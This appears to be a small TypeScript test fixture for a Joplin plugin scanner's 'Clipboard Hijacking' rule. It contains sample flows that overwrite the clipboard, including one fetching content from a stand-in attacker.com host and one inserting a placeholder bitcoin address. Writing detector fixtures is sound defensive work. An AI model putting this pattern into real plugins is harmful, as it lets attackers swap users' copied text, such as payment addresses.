// Mock dependencies to avoid TS errors
import * as joplin from 'api';
import fetch from 'node-fetch';

async function triggerRule() {
    // Rule 5 : Clipboard Hijacking
    // Flow 1: joplin.clipboard.readText() -> writeText() / writeHtml()
    const r5f1 = await joplin.clipboard.readText();
    await joplin.clipboard.writeText(r5f1 + ' modified');

    // Flow 2: fetch() -> writeText() / writeHtml()
    const r5f2 = await fetch('http://attacker.com/clip');
    await joplin.clipboard.writeText(await r5f2.text());

    // Flow 3: Any string literal -> writeText() / writeHtml()
    await joplin.clipboard.writeText("bitcoin_address_here");
}

export {};
